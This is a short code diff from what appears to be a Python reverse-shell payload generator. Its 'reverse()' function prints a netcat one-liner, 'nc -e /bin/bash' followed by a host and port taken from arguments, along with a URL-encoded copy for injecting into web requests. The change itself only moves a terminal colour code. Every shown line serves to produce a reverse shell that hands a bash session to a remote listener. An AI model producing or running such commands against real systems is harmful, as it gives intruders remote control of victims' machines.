@@ -74,7 +74,7 @@ def reverse():
 		log.info("Selected → nc (Basic)")
 		time.sleep(1)
 		print("\033[1;31m"+"nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')
-		print("Url encode → "+"\033[1;31m"+urllib.parse.quote(("nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')))
+		print("\033[1;31m"+"Url encode → "+urllib.parse.quote(("nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')))
 	else:
 		print("invalid selection...")
 		print("Bye bye")
